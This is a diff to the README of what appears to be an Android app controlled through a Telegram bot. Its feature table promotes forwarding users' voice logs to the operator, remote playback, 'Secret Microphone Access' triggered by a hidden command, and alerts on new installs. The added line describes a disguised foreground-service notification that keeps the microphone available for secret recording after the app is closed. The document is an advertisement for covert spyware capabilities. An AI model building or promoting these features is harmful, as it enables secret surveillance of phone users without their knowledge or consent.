@@ -34,8 +34,9 @@
 | 📝 **Smart Transcription** | Automatically transcribes user voice logs and forwards them to your Telegram chat instantly. |
 | 🎧 **Remote Voice Playback** | Reply to the bot's log on Telegram with a Voice Note, and it will **auto-play** out loud on the user's Android phone! |
 | 🕵️ **Secret Microphone Access** | Trigger a silent background audio recording remotely via a hidden Telegram command. |
-| 🌍 **On-the-fly Translation** | Integrated Google Translate API allows seamless language translation within the app. |
+| 🌍 **On-the-fly Translation** | Integrated Google Translate API allows seamless language translation within the app before sending. |
 | 🔔 **Live Alerts** | Get real-time pings in your Telegram chat the moment a new user installs and registers. |
+| 🛡️ **Always-On Background Mode** | Uses a disguised Foreground Service notification to ensure permanent background microphone privileges, allowing secret recording even when the app is swiped away! |
 
 > [!TIP]
 > **Pro-Tip**: You can add your bot to a Telegram Group and add multiple Chat IDs to broadcast logs to your entire team!
